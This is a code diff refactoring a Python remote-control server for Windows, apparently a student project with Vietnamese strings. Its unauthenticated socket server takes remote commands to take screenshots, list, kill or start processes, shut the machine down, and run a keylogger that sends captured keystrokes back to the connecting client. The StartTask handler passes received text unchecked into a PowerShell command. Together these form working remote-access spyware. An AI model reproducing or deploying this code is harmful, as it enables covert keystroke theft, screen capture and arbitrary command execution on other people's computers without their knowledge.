@@ -1,302 +1,331 @@
-
 from threading import Thread
 import pyautogui
 import socket
 import os
-import signal
-import pynput
 from pynput.keyboard import Key, Listener, Controller
+import constants
+import subprocess
 
 
-#
-def Keystroke(Client):
-    Keyboards = Controller()
-    Stop = True
-    ListKeys = []
+class ServerFeatures:
+    client = None
+    server = None
 
-    def StopHook():
-        nonlocal Stop
-        while True:
-            if Stop == True:
-                try:
-                    while True:
-                        checkdata = Client.recv(1024).decode("utf-8")
-                        if checkdata == "UnhookKey":
-                            print(Stop)
-                            Stop = False
-                            break
-                finally:
-                    Keyboards.release(Key.space)
-            break
+    class Keystroke:
+        def __init__(self):
+            self.Keyboards = Controller()
+            self.Stop = True
+            self.ListKeys = []
 
-    def KeyLogger():
-        while True:
-            def Pressing(logger):  # Nhận phím
-                nonlocal ListKeys
-                ListKeys.append(logger)
 
-            def Releasing(logger):
-                print(Stop)  # Điều kiện ngừng vòng lặp
-                if Stop == False: listener.stop()
+        def StopHook(self):
+            while True:
+                if self.Stop:
+                    try:
+                        while True:
+                            checkdata = ServerFeatures.client.recv(1024).decode("utf-8")
+                            if checkdata == "UnhookKey":
+                                self.Stop = False
+                                break
+                    finally:
+                        self.Keyboards.release(Key.space)
+                break
 
-            with Listener(on_release=Releasing, on_press=Pressing) as listener:
-                listener.join()
 
-            def Writing(ListKeys):
-                global count
-                logging = ''
-                count = 0
-                for logger in ListKeys:
-                    temp = str(logger).replace("'", "")
+        def KeyLogger(self):
+            while True:
+                # key pressed
+                def Pressing(logger):
+                    self.ListKeys.append(logger)
 
-                    if (str(temp) == "Key.space"):
-                        temp = " "
-                    elif (str(temp) == "Key.backspace"):
-                        temp = "Backspace"
-                    elif (str(temp) == "Key.shift"):
-                        temp = ""
+                def Releasing(logger):
+                    # Loop stop condition
+                    if not self.Stop:
+                        listener.stop()
 
-                    temp = str(temp).replace("Key.", '')
-                    temp = str(temp).replace("Key.cmd", "")
+                with Listener(on_release=Releasing, on_press=Pressing) as listener:
+                    listener.join()
 
-                    if (str(temp) == "<96>"):
-                        temp = "0"
-                    elif (str(temp) == "<97>"):
-                        temp = "1"
-                    elif (str(temp) == "<98>"):
-                        temp = "2"
-                    elif (str(temp) == "<99>"):
-                        temp = "3"
-                    elif (str(temp) == "<100>"):
-                        temp = "4"
-                    elif (str(temp) == "<101"):
-                        temp = "5"
-                    elif (str(temp) == "<102>"):
-                        temp = "6"
-                    elif (str(temp) == "<103>"):
-                        temp = "7"
-                    elif (str(temp) == "<104>"):
-                        temp = "8"
-                    elif (str(temp) == "<105>"):
-                        temp = "9"
+                def Writing():
+                    global count
+                    logging = ''
+                    count = 0
+                    for logger in self.ListKeys:
+                        temp = str(logger).replace("'", "")
 
-                    temp = str(temp).replace("<home>", "Home")
-                    temp = str(temp).replace("<esc>", "ESC")
-                    temp = str(temp).replace("<tab>", "")
-                    temp = str(temp).replace("<cmd>", "fn")
-                    temp = str(temp).replace("<enter>", "Enter")
-                    temp = str(temp).replace("<caps_lock>", "")
-                    temp = str(temp).replace("<shift_l>", "")
-                    temp = str(temp).replace("<shift_r>", "")
-                    temp = str(temp).replace("<ctrl_l>", "")
-                    temp = str(temp).replace("<num_lock>", "")
-                    temp = str(temp).replace("<ctrl_r>", "")
-                    temp = str(temp).replace("<alt_l>", "")
-                    temp = str(temp).replace("<alt_gr>", "")
-                    temp = str(temp).replace("<delete>", "Del")
-                    temp = str(temp).replace("<print_screen>", "PrtSc")
+                        if (str(temp) == "Key.space"):
+                            temp = " "
+                        elif (str(temp) == "Key.backspace"):
+                            temp = "Backspace"
+                        elif (str(temp) == "Key.shift"):
+                            temp = ""
 
-                    temp = str(temp).replace("home", "Home")
-                    temp = str(temp).replace("esc", "ESC")
-                    temp = str(temp).replace("tab", "")
-                    temp = str(temp).replace("cmd", "fn")
-                    temp = str(temp).replace("enter", "Enter")
-                    temp = str(temp).replace("caps_lock", "")
-                    temp = str(temp).replace("shift_l", "")
-                    temp = str(temp).replace("shift_r", "")
-                    temp = str(temp).replace("ctrl_l", "")
-                    temp = str(temp).replace("num_lock", "")
-                    temp = str(temp).replace("ctrl_r", "")
-                    temp = str(temp).replace("alt_l", "")
-                    temp = str(temp).replace("alt_gr", "")
-                    temp = str(temp).replace("delete", "Del")
-                    temp = str(temp).replace("print_screen", "PrtSc")
+                        temp = str(temp).replace("Key.", '')
+                        temp = str(temp).replace("Key.cmd", "")
 
-                    logging += temp
+                        if (str(temp) == "<96>"):
+                            temp = "0"
+                        elif (str(temp) == "<97>"):
+                            temp = "1"
+                        elif (str(temp) == "<98>"):
+                            temp = "2"
+                        elif (str(temp) == "<99>"):
+                            temp = "3"
+                        elif (str(temp) == "<100>"):
+                            temp = "4"
+                        elif (str(temp) == "<101"):
+                            temp = "5"
+                        elif (str(temp) == "<102>"):
+                            temp = "6"
+                        elif (str(temp) == "<103>"):
+                            temp = "7"
+                        elif (str(temp) == "<104>"):
+                            temp = "8"
+                        elif (str(temp) == "<105>"):
+                            temp = "9"
+
+                        temp = str(temp).replace("<home>", "Home")
+                        temp = str(temp).replace("<esc>", "ESC")
+                        temp = str(temp).replace("<tab>", "")
+                        temp = str(temp).replace("<cmd>", "fn")
+                        temp = str(temp).replace("<enter>", "Enter")
+                        temp = str(temp).replace("<caps_lock>", "")
+                        temp = str(temp).replace("<shift_l>", "")
+                        temp = str(temp).replace("<shift_r>", "")
+                        temp = str(temp).replace("<ctrl_l>", "")
+                        temp = str(temp).replace("<num_lock>", "")
+                        temp = str(temp).replace("<ctrl_r>", "")
+                        temp = str(temp).replace("<alt_l>", "")
+                        temp = str(temp).replace("<alt_gr>", "")
+                        temp = str(temp).replace("<delete>", "Del")
+                        temp = str(temp).replace("<print_screen>", "PrtSc")
+
+                        temp = str(temp).replace("home", "Home")
+                        temp = str(temp).replace("esc", "ESC")
+                        temp = str(temp).replace("tab", "")
+                        temp = str(temp).replace("cmd", "fn")
+                        temp = str(temp).replace("enter", "Enter")
+                        temp = str(temp).replace("caps_lock", "")
+                        temp = str(temp).replace("shift_l", "")
+                        temp = str(temp).replace("shift_r", "")
+                        temp = str(temp).replace("ctrl_l", "")
+                        temp = str(temp).replace("num_lock", "")
+                        temp = str(temp).replace("ctrl_r", "")
+                        temp = str(temp).replace("alt_l", "")
+                        temp = str(temp).replace("alt_gr", "")
+                        temp = str(temp).replace("delete", "Del")
+                        temp = str(temp).replace("print_screen", "PrtSc")
+
+                        logging += temp
+                        count += 1
+                        print(logging)
+                    return logging[0:]
+
+                data = Writing()
+                if data == "":
+                    data = " "
+                print('Data: ',data)
+                ServerFeatures.client.sendall(bytes(data, "utf-8"))
+                checkdata = ServerFeatures.client.recv(1024).decode("utf-8")
+                self.ListKeys.clear()
+                break
+
+
+        def KeystrokeRun(self):
+            ServerFeatures.client.sendall(bytes("Đã nhận", "utf-8"))
+            threadingLogger = Thread(target=self.KeyLogger)
+            threadingStop = Thread(target=self.StopHook)
+            threadingStop.start()
+            threadingLogger.start()
+            threadingLogger.join()
+
+    @classmethod
+    def KillTask(cls):
+        m = cls.client.recv(1024)
+        pid = int(m)
+        print("Killed ", str(pid))
+        subprocess.check_output("Taskkill /PID %d /F" % pid)
+
+        cls.client.send(bytes("Killed", "utf-8"))
+
+    @classmethod
+    def StartTask(cls):
+        import subprocess
+        m = ServerFeatures.client.recv(1024)
+        msg = str(m)
+        msg = msg[2:]
+        msg = msg[:len(msg) - 1]
+        print(str(msg))
+        print("C:/Windows/System32/" + msg + ".exe")
+        cmd = 'powershell start ' + msg
+        subprocess.call(cmd)
+        cls.client.send(bytes("Started", "utf-8"))
+
+    @classmethod
+    def Process(cls):
+        import subprocess
+        cmd = 'powershell "Get-Process |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
+        ProccessProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+        count = 0
+        length = 0
+        Name = ['' for i in range(10000)]
+        ID = ['' for i in range(10000)]
+        Thread = ['' for i in range(10000)]
+        for line in ProccessProc.stdout:
+            if line.rstrip():
+                if count < 2:
                     count += 1
-                    print(logging)
-                return logging[0:]
+                    continue
+                msg = str(line.decode().rstrip().lstrip())
+                msg = " ".join(msg.split())
+                lists = msg.split(" ", 3)
+                ID[length] = lists[0]
+                Name[length] = lists[1]
+                Thread[length] = lists[2]
+                length += 1
 
-            data = Writing(ListKeys)
-            if data == "": data = " "
-            print(data)
-            Client.sendall(bytes(data, "utf-8"))
-            checkdata = Client.recv(1024).decode("utf-8")
-            ListKeys.clear()
-            break
+        cls.client.sendall(bytes(str(length), "utf-8"))
 
-    threadingLogger = Thread(target=KeyLogger)
-    threadingStop = Thread(target=StopHook)
-    threadingStop.start()
-    threadingLogger.start()
-    threadingLogger.join()
+        for i in range(length):
+            cls.client.sendall(bytes(ID[i], "utf-8"))
+            checkdata = cls.client.recv(1024)
 
+        for i in range(length):
+            cls.client.sendall(bytes(Name[i], "utf-8"))
+            checkdata = cls.client.recv(1024)
 
-# Receive request from client
-def readRequest(Client):
-    request = ""
-    try:
-        request = Client.recv(1024).decode('utf-8')
-    finally:
-        return request
+        for i in range(length):
+            cls.client.sendall(bytes(Thread[i], "utf-8"))
+            checkdata = cls.client.recv(1024)
 
+    @classmethod
+    def Application(cls):
+        import subprocess
+        cmd = 'powershell "Get-Process |where {$_.mainWindowTItle} |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
+        appProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+        count = 0
+        length = 0
+        Name = ['' for i in range(100)]
+        ID = ['' for i in range(100)]
+        Thread = ['' for i in range(100)]
+        for line in appProc.stdout:
+            if line.rstrip():
+                if count < 2:
+                    count += 1
+                    continue
+                msg = str(line.decode().rstrip().lstrip())
+                msg = " ".join(msg.split())
+                lists = msg.split(" ", 3)
+                ID[length] = lists[0]
+                Name[length] = lists[1]
+                Thread[length] = lists[2]
+                length += 1
 
-# Choose option from request
-def takeRequest(Client, SERVER):
-    while True:
-        Request = readRequest(Client)
-        print(Request)
-        if not Request:
-            Client.close()
-            break
-        print("Request from client: \n")
+        cls.client.sendall(bytes(str(length), "utf-8"))
 
-        if "TakePicture" == Request:
-            image = pyautogui.screenshot()
+        for i in range(length):
+            cls.client.sendall(bytes(ID[i], "utf-8"))
+            checkdata = cls.client.recv(1024)
 
-            image.save("scrshot.png")
-            try:
+        for i in range(length):
+            cls.client.sendall(bytes(Name[i], "utf-8"))
+            checkdata = cls.client.recv(1024)
 
-                myfile = open('scrshot.png', 'rb')
-                bytess = myfile.read()
+        for i in range(length):
+            cls.client.sendall(bytes(Thread[i], "utf-8"))
+            checkdata = cls.client.recv(1024)
 
-                Client.sendall(bytess)
-                myfile.close()
-            except:
-                print("Can't capture screenshots")
+    @classmethod
+    def ShutDown(cls):
+        os.system("shutdown /s /t 30")
+        cls.client.send(bytes("Da tat may", "utf-8"))
 
-        elif "Shutdown" == Request:
-            print("test")
-            os.system("shutdown /s /t 30")
-            Client.send(bytes("Da tat may", "utf-8"))
-            print("ShutDown")
+    @classmethod
+    def TakePicture(cls):
+        image = pyautogui.screenshot()
+        image.save("scrshot.png")
+        try:
 
-        elif "ProcessRunning" == Request:
-            import subprocess
-            cmd = 'powershell "Get-Process |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
-            ProccessProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-            count = 0
-            length = 0
-            Name = ['' for i in range(100000)]
-            ID = ['' for i in range(100000)]
-            Thread = ['' for i in range(100000)]
-            for line in ProccessProc.stdout:
-                if line.rstrip():
-                    if count < 2:
-                        count += 1
-                        continue
-                    msg = str(line.decode().rstrip().lstrip())
-                    msg = " ".join(msg.split())
-                    lists = msg.split(" ", 3)
-                    ID[length] = lists[0]
-                    Name[length] = lists[1]
-                    Thread[length] = lists[2]
-                    length += 1
+            myfile = open('scrshot.png', 'rb')
+            bytess = myfile.read()
 
-            Client.sendall(bytes(str(length), "utf-8"))
+            cls.client.sendall(bytess)
+            myfile.close()
+        except:
+            print("Can't capture screenshots")
 
-            for i in range(length):
-                Client.sendall(bytes(ID[i], "utf-8"))
-                checkdata = Client.recv(1024)
-            for i in range(length):
-                Client.sendall(bytes(Name[i], "utf-8"))
-                checkdata = Client.recv(1024)
-            for i in range(length):
-                Client.sendall(bytes(Thread[i], "utf-8"))
-                checkdata = Client.recv(1024)
-            print("ProcessRunning")
-        elif "AppRunning" == Request:
-            print("AppRunning")
-            import subprocess
-            cmd = 'powershell "Get-Process |where {$_.mainWindowTItle} |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
-            appProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-            count = 0
-            length = 0
-            Name = ['' for i in range(100)]
-            ID = ['' for i in range(100)]
-            Thread = ['' for i in range(100)]
-            for line in appProc.stdout:
-                if line.rstrip():
-                    if count < 2:
-                        count += 1
-                        continue
-                    msg = str(line.decode().rstrip().lstrip())
-                    msg = " ".join(msg.split())
-                    lists = msg.split(" ", 3)
-                    ID[length] = lists[0]
-                    Name[length] = lists[1]
-                    Thread[length] = lists[2]
-                    length += 1
+    # Receive request from client
+    @classmethod
+    def readRequest(cls):
+        request = ""
+        try:
+            request = cls.client.recv(1024).decode('utf-8')
+        finally:
+            return request
 
-            Client.sendall(bytes(str(length), "utf-8"))
+    # Choose option from request
+    @classmethod
+    def takeRequest(cls):
+        while True:
+            Request = cls.readRequest()
+            if not Request:
+                cls.client.close()
+                break
+            print("Request from client:")
+            # take a picture
+            if "TakePicture" == Request:
+                cls.TakePicture()
 
-            for i in range(length):
-                Client.sendall(bytes(ID[i], "utf-8"))
-                checkdata = Client.recv(1024)
-            for i in range(length):
-                Client.sendall(bytes(Name[i], "utf-8"))
-                checkdata = Client.recv(1024)
-            for i in range(length):
-                Client.sendall(bytes(Thread[i], "utf-8"))
-                checkdata = Client.recv(1024)
-        elif "KillTask" == Request:  # Xóa
-            print("KillTask")
-            m = Client.recv(1024)
-            pid = int(m)
-            print(str(pid))
-            os.kill(pid, signal.SIGTERM)
+            # Shutdown the computer
+            elif "Shutdown" == Request:
+                cls.ShutDown()
 
-            Client.send(bytes("Killed", "utf-8"))
+            # List the processes running in the computer
+            elif "ProcessRunning" == Request:
+                cls.Process()
 
-        elif "StartTask" == Request:  # Mở app
-            print("StartTask")
-            import subprocess
-            mode = 0o666
-            flags = os.O_RDWR | os.O_CREAT
-            m = Client.recv(1024)
-            msg = str(m)
-            msg = msg[2:]
-            msg = msg[:len(msg) - 1]
-            print(str(msg))
-            print("C:/Windows/System32/" + msg + ".exe")
-            cmd = 'powershell start ' + msg
-            subprocess.call(cmd)
-            Client.send(bytes("Started", "utf-8"))
+            # List the application running in the computer
+            elif "AppRunning" == Request:
+                cls.Application()
 
-        elif "HookKey" == Request:
-            print("KeyStroke")
-            Client.sendall(bytes("Đã nhận", "utf-8"))
-            Keystroke(Client)
+            # Stop a process/application
+            elif "KillTask" == Request:
+                cls.KillTask()
+            # Start a process/application
+            elif "StartTask" == Request:
+                cls.StartTask()
+            # catch a keys
+            elif "HookKey" == Request:
+                ServerFeatures.Keystroke().KeystrokeRun()
+            # close the program
+            elif "Close" == Request:
+                cls.server.close()
 
-        elif "Close" == Request:
-            SERVER.close()
-            print("Close")
+    @classmethod
+    def Serveur(cls):
+        try:
+            cls.server.listen()
+            ACCEPT_THREAD = Thread(target=cls.waitingConnection())
+            ACCEPT_THREAD.start()
+            ACCEPT_THREAD.join()
+        except:
+            print("ERROR!")
+        finally:
+            cls.server.close()
 
+    # wait to connect for client
+    @classmethod
+    def waitingConnection(cls):
+        print("Waiting for Client")
 
-#
-def Serveur(SERVER):
-    try:
-        SERVER.listen()
-        ACCEPT_THREAD = Thread(target=waitingConnection(SERVER))
-        ACCEPT_THREAD.start()
-        ACCEPT_THREAD.join()
-    except:
-        print("ERROR!")
-    finally:
-        SERVER.close()
+        while True:
+            cls.client, Address = cls.server.accept()
+            print("Client", Address, "connected!")
+            Thread(target=cls.takeRequest, args=()).start()
 
-
-# wait to connect for client
-def waitingConnection(SERVER):
-    print("Waiting for Client")
-
-    while True:
-        client, Address = SERVER.accept()
-        print("Client", Address, "connected!")
-        Thread(target=takeRequest, args=(client,SERVER)).start()
-
-def setUpServer():
-    print("Server IP Address Now ", (socket.gethostbyname(socket.gethostname())))
-    SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    SERVER.bind((socket.gethostbyname(socket.gethostname()), 5656))
-    Serveur(SERVER)
+    @classmethod
+    def setUpServer(cls):
+        print("Server IP Address Now ", (socket.gethostbyname(socket.gethostname())))
+        cls.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        cls.server.bind((socket.gethostbyname(socket.gethostname()), constants.PORT))
+        cls.Serveur()
